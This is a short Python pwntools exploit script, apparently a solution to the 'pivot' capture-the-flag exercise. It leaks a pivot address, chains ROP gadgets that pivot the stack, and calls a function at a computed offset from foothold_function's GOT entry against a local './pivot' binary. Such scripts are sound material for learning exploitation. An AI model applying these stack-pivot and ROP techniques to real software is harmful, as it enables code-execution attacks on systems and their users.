from pwn import *

def pivot(resp):
    pivot = "A" * 40
    #stack pivot
    pivot += p64(0x0000000000400b00)#pop rax, ret;
    pivot += p64(resp)
    pivot += p64(0x0000000000400b02)#xchg rax rsp
    return pivot

def rop(e):
    rop = ''
    rop += p64(e.plt['foothold_function'])
    rop += p64(0x0000000000400b00) #pop rax
    rop += p64(e.got['foothold_function'])
    rop += p64(0x0000000000400b05)#mov rax [rax]
    rop += p64(0x0000000000400900)#pop rbp
    rop += p64(0x14e)
    rop += p64(0x0000000000400b09) #add rax rbp
    rop += p64(0x000000000040098e)#call rax
    return rop

def exploit(r, e):
    gdb.attach(r)
    r.recvuntil('pivot: ')
    resp = int(r.recvuntil('S').replace('S', ''),16)
    print "donde pivotear : ",hex(resp)
    payload = pivot(resp)
    exploit = rop(e)
    
    r.sendlineafter("> ", exploit)
    r.recvuntil("> ")
    r.sendline(payload)

    r.interactive()


def main():
    e = ELF('./pivot')
    r = process('./pivot')
    exploit(r, e)

if __name__ == "__main__":
    main()